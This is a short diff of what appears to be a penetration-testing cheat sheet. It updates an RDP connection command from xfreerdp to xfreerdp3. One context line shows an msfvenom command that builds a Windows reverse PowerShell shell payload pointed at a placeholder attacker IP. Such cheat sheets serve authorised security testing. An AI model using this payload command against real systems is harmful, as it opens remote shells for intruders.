@@ -538,7 +538,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=<attacker-ip> lport=<port> > sh
 ```
 ### RDP 3389
 ```bash
-xfreerdp /u:<user> /d:Target_Domain>  /v:<target_IP>
+xfreerdp3 /u:<user> /d:Target_Domain>  /v:<target_IP>
 ```
 ### WinRM 5985 
 ```bash
